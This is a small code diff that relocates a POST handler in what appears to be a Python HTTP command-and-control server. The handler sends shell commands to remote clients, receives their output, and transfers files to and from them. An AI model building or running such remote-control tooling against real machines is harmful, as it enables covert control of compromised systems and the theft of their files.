@@ -95,6 +95,15 @@ def handle_get(self):
     self.wfile.write(command.encode())
 
 
+def handle_post(self):
+    if self.headers.get('Function') == 'get_file':
+        get_file(self)
+    elif self.headers.get('Function') == 'put_file':
+        put_file(self)
+    else:
+        shell_comands(self)
+
+
 def get_file(self):
     try:
         ctype, pdict = cgi.parse_header(self.headers.get('content-type'))
@@ -133,15 +142,6 @@ def shell_comands(self):
     length = int(self.headers['Content-Length'])
     command_output = self.rfile.read(length).decode()
     print(command_output)
-
-
-def handle_post(self):
-    if self.headers.get('Function') == 'get_file':
-        get_file(self)
-    elif self.headers.get('Function') == 'put_file':
-        put_file(self)
-    else:
-        shell_comands(self)
 
 
 class Server(BaseHTTPRequestHandler):
